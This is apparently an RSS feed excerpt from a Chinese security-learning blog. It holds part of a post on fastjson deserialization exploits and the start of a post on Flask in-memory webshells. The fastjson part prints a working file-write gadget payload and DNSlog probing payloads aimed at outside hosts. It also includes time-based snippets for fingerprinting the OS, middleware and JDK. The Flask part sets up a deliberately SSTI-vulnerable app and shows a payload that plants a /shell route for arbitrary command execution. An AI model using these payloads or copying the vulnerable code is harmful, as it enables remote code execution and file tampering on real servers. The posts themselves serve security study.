class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>但是写入文件有限，有些特殊字符写不了，比如php代码</p><blockquote><p>payload直接抄了，怎么写出来的就不管了（</p></blockquote><p>代码示例：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.File_Use;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">File_Write</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;stream\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;targetPath\&quot;: \&quot;D:/hacked.txt\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;tempPath\&quot;: \&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;writer\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.esotericsoftware.kryo.io.Output\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;buffer\&quot;: \&quot;cHduZWQ=\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;outputStream\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            \&quot;$ref\&quot;: \&quot;$.stream\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;position\&quot;: 5\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;close\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.sleepycat.bind.serial.SerialOutput\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;out\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            \&quot;$ref\&quot;: \&quot;$.writer\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409032034460.png" alt="image-20240903203402350"></p><p>buff这里传的是base64之后的数据</p><p><strong>补丁分析</strong></p><p>额额额该版本之后的补丁又是粗暴的给expectClass多加上一些黑名单</p><h2 id="safemode"><a href="#SafeMode" class="headerlink" title="SafeMode"></a>SafeMode</h2><p>在1.2.68之后的版本，在1.2.68版本中，fastjson增加了safeMode的支持。safeMode打开后，完全禁用autoType。</p><p>开启如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setSafeMode(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>开启之后直接完全禁用autoType，即@type</p><p><img src="https://cdn.clown2024.cn/202409032040917.png" alt="image-20240903204034792"></p><p>获取是否设置了SafeMode，如果是则直接抛出异常终止运行</p><h1 id="fastjson1280"><a href="#Fastjson1-2-80" class="headerlink" title="Fastjson1.2.80"></a>Fastjson1.2.80</h1><p>1.2.68之后新版本将<code>java.lang.Runnable、java.lang.Readable和java.lang.AutoCloseable</code>加入了黑名单，这里就利用另一个期望类，异常类<code>Throwable</code></p><p>这里就看一下这篇文章就行了：<a href="https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%9C%8B%E8%B5%B7%E6%9D%A5%E5%BE%88%E9%9A%BE%E6%9C%89rce%E7%9A%84%E7%82%B9%EF%BC%88%E4%B8%BB%E8%A6%81%E6%98%AF%E6%87%92%E4%BA%86%E4%B8%8D%E6%83%B3%E5%86%8D%E5%86%99%E4%BA%86%F0%9F%98%A2">https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ，因为看起来很难有rce的点（主要是懒了不想再写了😢</a></p><h1 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h1><p>平时用于探测fastjson的一些信息来考虑如何利用，参考文章：<a href="https://forum.butian.net/share/2858%EF%BC%8Chttps://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement">https://forum.butian.net/share/2858，https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement</a></p><p>然后使用safe6Sec师傅的复现环境来做测试：<a href="https://github.com/safe6Sec/ShiroAndFastJson">https://github.com/safe6Sec/ShiroAndFastJson</a></p><p>将其中&#x2F;json路由的代码修改一下方便查看解析结果或者解析报错：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/json&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title function_">parse</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String data)</span> &#123;<br>    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>    <span class="hljs-keyword">try</span> &#123;<br>        jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-number">0</span>);<br>        jsonObject.put(<span class="hljs-string">&quot;message&quot;</span>, String.valueOf(JSON.parse(data)));<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, -<span class="hljs-number">1</span>);<br>        jsonObject.put(<span class="hljs-string">&quot;error&quot;</span>, e.getMessage());<br>    &#125;<br>    <span class="hljs-keyword">return</span> jsonObject;<br>&#125;<br></code></pre></td></tr></table></figure><p>后面直接向&#x2F;json路由进行post请求即可</p><h2 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h2><p>参考文章：<a href="https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement">https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement</a></p><p><strong>具体版本探测</strong></p><p>参考文章：<a href="https://b1ue.cn/archives/402.html">https://b1ue.cn/archives/402.html</a></p><p>具体原理是JavaBeanDeserializer 类异常的 message 会把当前 fastjson 的版本号输出，所以需要构造出能令这个类抛出异常的错误即可</p><p><img src="https://cdn.clown2024.cn/202409052248218.png" alt="image-20240905224846071"></p><p>这里直接列出文章需要满足的报错条件：</p><ul><li>当代码使用 <code>JSON.parseObject(json , clazz)</code> 指定期望类的方式去解析 JSON，且 clazz 不能为 fastjson 已设定的大部分类型，如“Hashmap”、“ArrayList”</li><li>当使用 <code>JSON.parse(json)</code> 不指定期望类的时候可以通过 AutoCloseable 来触发</li></ul><p>比如这样：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>   <span class="hljs-comment">//该方法尝试了一下直到1.2.80都还可以探测出</span><br> <br><span class="hljs-comment">//下面这个据说也能探测，但是该靶场没有成功</span><br><span class="hljs-punctuation">[</span><span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409052252040.png" alt="image-20240905225213882"></p><p><strong>探测DNS</strong></p><p>参考文章：<a href="https://blog.csdn.net/why811/article/details/133679673">https://blog.csdn.net/why811/article/details/133679673</a></p><p>DNS探测主要是为了探测是否为fastjson</p><p>这里dnslog可以直接用yakit生成</p><p><img src="https://cdn.clown2024.cn/202409051322413.png" alt="image-20240905132158243"></p><p>这里纯收集payload复现了，没找到什么分析的文章</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetAddress&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;muwoiavfqk.dgrh3.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>不过这个gadget在1.2.48禁止了</p></blockquote><p>1.2.68版本结果</p><p><img src="https://cdn.clown2024.cn/202409051325045.png" alt="image-20240905132543897"></p><p>笑死yakit的dnslog没记录出来，dnslog平台的可以</p><p><img src="https://cdn.clown2024.cn/202409051337491.png" alt="image-20240905133750354"></p><p><img src="https://cdn.clown2024.cn/202409051337590.png" alt="image-20240905133730460"></p><p>各种payload</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet6Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//下面是一些畸形payload，会报错但是也能触发dnslog</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaa&quot;</span><span class="hljs-punctuation">&#125;</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>这里可能有时候探测出现问题，说type not match，其实原因是，有的开发在使用fastjson解析请求时会使用Spring的@RequestBody注释，告诉解析引擎，我需要的是一个User类对象</p><p>最外层一定是数组或者对象，不要加@type，然后将Payload作为其中一个键值，比如：</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-string">&quot;xxx&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样写通常就不会有type not match的</p><p><code>下面的探测是存在fastjson并且可以加载字节码的情况，纯粹记录没有尝试过</code></p><h2 id="操作系统探测"><a href="#操作系统探测" class="headerlink" title="操作系统探测"></a>操作系统探测</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">osName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();<br>        System.out.println(osName);<br>        <span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;nix&quot;</span>) || osName.contains(<span class="hljs-string">&quot;nux&quot;</span>) || osName.contains(<span class="hljs-string">&quot;mac&quot;</span>))<br>        &#123;<br>            Thread.sleep(<span class="hljs-number">3000</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>            Thread.sleep(<span class="hljs-number">6000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            Thread.sleep(<span class="hljs-number">9000</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><h2 id="中间件探测"><a href="#中间件探测" class="headerlink" title="中间件探测"></a>中间件探测</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">stackTraces</span> <span class="hljs-operator">=</span> Thread.getAllStackTraces();<br>        <span class="hljs-keyword">for</span> (Map.Entry entry : stackTraces.entrySet()) &#123;<br>            StackTraceElement[] stackTraceElements = entry.getValue();<br>            <span class="hljs-keyword">for</span> (StackTraceElement element : stackTraceElements) &#123;<br><span class="hljs-comment">// element.getClassName().contains(&quot;org.springframework.web&quot;</span><br>                <span class="hljs-keyword">if</span> (element.getClassName().contains(<span class="hljs-string">&quot;org.apache.catalina.core&quot;</span>)) &#123;<br>                    Thread.sleep(<span class="hljs-number">5000</span>);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h2 id="探测jdk版本"><a href="#探测JDK版本" class="headerlink" title="探测JDK版本"></a>探测JDK版本</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取 Java 版本</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">javaVersion</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>);<br><span class="hljs-comment">// 解析主版本号</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">majorVersion</span> <span class="hljs-operator">=</span> Integer.parseInt(javaVersion.split(<span class="hljs-string">&quot;\\.&quot;</span>)[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">// 进⾏版本判断</span><br>        <span class="hljs-keyword">switch</span> (majorVersion) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                Thread.sleep(<span class="hljs-number">2000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>                Thread.sleep(<span class="hljs-number">3000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>                Thread.sleep(<span class="hljs-number">4000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                Thread.sleep(<span class="hljs-number">5000</span>);<br>                <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;fastjson介绍&quot;&gt;&lt;a href=&quot;#fastjson介绍&quot; class=&quot;headerlink&quot; title=&quot;fastjson介绍&quot;&gt;&lt;/a&gt;fastjson介绍&lt;/h1&gt;&lt;p&gt;官方github地址：&lt;a href=&quot;https://github.com</summary>
      
    
    
    
    <category term="java漏洞" scheme="https://clowsman.github.io/categories/java%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>flask内存马学习</title>
    <link href="https://clowsman.github.io/2024/08/17/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/08/17/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-08-17T08:42:44.000Z</published>
    <updated>2024-10-19T16:57:23.229Z</updated>
    
    <content type="html"><![CDATA[<p>拖了很久终于来看一下flask内存马这个东西了，主要是发现某新生赛week2就要打flask内存马，赶紧来学了😢</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>内存马就是无文件webshell，这个不多说了，python的内存马就是在网站运行的时候动态注册一个路由用于任意命令执行。</p><p>python的内存马通常会配合ssti或者pickle反序列化等手段来使用，主要是为了解决不出网的情况。</p><h1 id="低版本内存马"><a href="#低版本内存马" class="headerlink" title="低版本内存马"></a>低版本内存马</h1><p>先简单写一个ssti漏洞的flask服务</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string<br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    person=<span class="hljs-string">&quot;guest&quot;</span><br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>):<br>        person=request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;</span> % person<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h2 id="内存马效果"><a href="#内存马效果" class="headerlink" title="内存马效果"></a>内存马效果</h2><p>这是一个基础的内存马payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)<br></code></pre></td></tr></table></figure><p>我们可以去向name传递这个参数看看效果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1:8000/?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><blockquote><p>艹这里有个坑，不能开debug模式，开了debug模式会报下面的错误，又害得我检查了好一会payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">AssertionError: A setup function was called after the first request was handled. This usually indicates a bug in the application where a module was not imported and decorators or other functionality was called too late.<br>To fix this make sure to import all your view modules, database models, and everything related at a central place before the application starts serving requests.<br></code></pre></td></tr></table></figure><p>这是一个断言错误，百度翻译结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">AssertionError：在处理第一个请求后调用了设置函数。这通常表示应用程序中存在错误，其中模块未导入，装饰器或其他功能调用过晚。<br>要解决此问题，请确保在应用程序开始处理请求之前，将所有视图模块、数据库模型和所有相关内容导入到一个中心位置。<br></code></pre></td></tr></table></figure></blockquote><p><img src="https://cdn.clown2024.cn/202410161514511.png" alt="image-20241016151406420"></p><p>这里就打进去了，我们再去访问一下&#x2F;shell路由cmd传参即可</p><p><img src="https://cdn.clown2024.cn/202410161514393.png" alt="image-20241016151454348"></p><h2 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h2><p>现在我们就来分析一下payload，把他拆成这样清晰一点</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json">url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;__builtins__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;eval&#x27;<span class="hljs-punctuation">]</span>(<br><span class="hljs-string">&quot;app.add_url_rule(</span><br><span class="hljs-string">&#x27;/shell&#x27;, </span><br><span class="hljs-string">&#x27;shell&#x27;, </span><br><span class="hljs-string">lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br><span class="hljs-string">)</span><br><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#123;</span><br>&#x27;_request_ctx_stack&#x27;<span class="hljs-punctuation">:</span>url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;_request_ctx_stack&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>&#x27;app&#x27;<span class="hljs-punctuation">:</span>url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;current_app&#x27;<span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br>)<br></code></pre></td></tr></table></figure><p>首先url_for.__globals__[‘__builtins__‘][‘eval’]这就是一个ssti获取eval函数的payload，url_for是Flask的一个内置函数，其命名空间包含很多东西，包括我们待会需要拿的当前应用的上下文</p><p><strong>app.add_url_rule</strong>，这是调用app的一个add_url_rule的添加路由的函数，是属于Flask类里面的一个成员方法，写代码的时候一般是使用@app.route装饰器来实现的，我们可以看一下源码</p><p><img src="https://cdn.clown2024.cn/202410161650862.png" alt="image-20241016165044813"></p><p>他调用的就是add_url_rule，我们再去看一下add_url_rule的源码</p><p><img src="https://cdn.clown2024.cn/202410161652015.png" alt="image-20241016165251968"></p><p>参数说明，直接问一手gpt，感觉说的挺清楚的</p><ol><li><strong><code>self</code></strong>:<ul><li>表示当前类的实例，通常是 Flask 应用或蓝图的实例。</li></ul></li><li><strong><code>rule: str</code></strong>:<ul><li>URL 规则的字符串。例如，<code>&#39;/hello&#39;</code> 或 <code>&#39;/users/&lt;int:id&gt;&#39;</code>。这是用户访问时需要匹配的路径。</li></ul></li><li><strong><code>endpoint: t.Optional[str] = None</code></strong>:<ul><li>视图函数的端点名称。端点是 Flask 用于标识视图函数的唯一名称。如果未提供，则会从 <code>view_func</code> 自动生成。</li></ul></li><li><strong><code>view_func: t.Optional[t.Callable] = None</code></strong>:<ul><li>处理请求的视图函数。如果提供了这个参数，Flask 会将其与 URL 规则关联。</li></ul></li><li><strong><code>provide_automatic_options: t.Optional[bool] = None</code></strong>:<ul><li>指示是否自动处理 OPTIONS 请求。如果未提供，Flask 会根据视图函数的属性决定。</li></ul></li><li><strong><code>\**options: t.Any</code></strong>:<ul><li>其他可选的关键字参数，可以用于配置 URL 规则的行为，比如 <code>defaults</code>、<code>strict_slashes</code> 等。</li></ul></li></ol><p>所以payload的add_url_rule的这部分就是添加一个路由，然后处理函数是用lambda关键字定义的匿名函数</p><p><strong>app</strong>：eval的第二个参数就是用字典的形式定义一些全局变量给第一个参数也就是执行命令的时候用，这里的app就是用url_for获取的应用的当前上下文app，属性为<strong>current_app</strong>；</p><p><strong>_request_ctx_stack</strong>：<code>_request_ctx_stack</code>是Flask的一个全局变量，是一个LocalStack实例</p><p>为什么要获取这个变量呢，这和Flask的请求上下文管理机制有关：</p><blockquote><p>当一个请求进入Flask，首先会实例化一个Request Context，这个上下文封装了请求的信息在Request中，并将这个上下文推入到一个名为<code>_request_ctx_stack</code> 的栈结构中，也就是说获取当前的请求上下文等同于获取<code>_request_ctx_stack</code>的栈顶元素<code>_request_ctx_stack.top</code> 。</p></blockquote><p>简单来讲，就是当一个请求过来的时候，会实例化一个对象来封装和这个请求有关的东西，然后再推到栈中，我们可以ssti去看一下来验证</p><p>首先是<strong>url_for.__globals__[‘_request_ctx_stack’].top</strong></p><p><img src="https://cdn.clown2024.cn/202410161712177.png" alt="image-20241016171228118"></p><p>可以看到确实是一个RequestContext 对象</p><p>再看一下有什么属性，<strong>url_for.__globals__[‘<em>request_ctx_stack’].top.__dict</em>_</strong></p><p><img src="https://cdn.clown2024.cn/202410161714469.png" alt="image-20241016171427411"></p><p>可以看到request对象在里面，也就是我们常用的获取请求中的get和post传参的那个request，所以pyaload中为什么获取这个request也很清晰了</p><h2 id="绕过变形"><a href="#绕过变形" class="headerlink" title="绕过变形"></a>绕过变形</h2><p>其实也就是一些ssti的绕过，就记录一下url_for的替换</p><ul><li><code>url_for</code>可用<code>get_flashed_messages</code>或<code>request.application.__self__._get_data_for_json</code>等替换；</li></ul><p>get_flashed_messages.__globals__[‘_request_ctx_stack’].top.__dict__</p><p><img src="https://cdn.clown2024.cn/202410161723665.png" alt="image-20241016172323613"></p><p>get_flashed_messages.__globals__</p><p>这个有待考究，我是找不到他的globals属性的，会直接500，我看文章他们大概是这么用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs 